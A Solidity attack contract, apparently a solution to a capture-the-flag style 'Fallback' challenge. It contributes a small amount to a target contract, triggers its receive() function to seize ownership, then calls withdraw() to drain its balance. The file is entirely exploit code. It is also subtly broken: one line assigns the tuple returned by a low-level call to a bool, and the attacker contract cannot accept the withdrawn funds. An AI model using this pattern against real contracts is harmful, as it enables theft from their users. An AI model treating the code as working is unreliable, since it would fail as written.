pragma solidity ^0.8.0;
contract FallbackAttacker {
    address private immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() external payable {
        require(msg.value >= 2, "Need at least 2 wei to attack");

        // Contribute 1 wei to instance
        (bool success, ) = address(instance).call{value: 1}(
            abi.encodeWithSelector(bytes4(keccak256("contribute()")))
        );
        require(success, "Contribute failed");

        // Send 1 wei directly to instance to trigger receive()
        success = address(instance).call{value: 1}("");
        require(success, "Trigger receive failed");
    }

    function callWithdraw() external {
        // Call instance's withdraw
        (bool success, ) = address(instance).call(
            abi.encodeWithSelector(bytes4(keccak256("withdraw()")))
        );
        require(success, "Withdraw call failed");
    }
}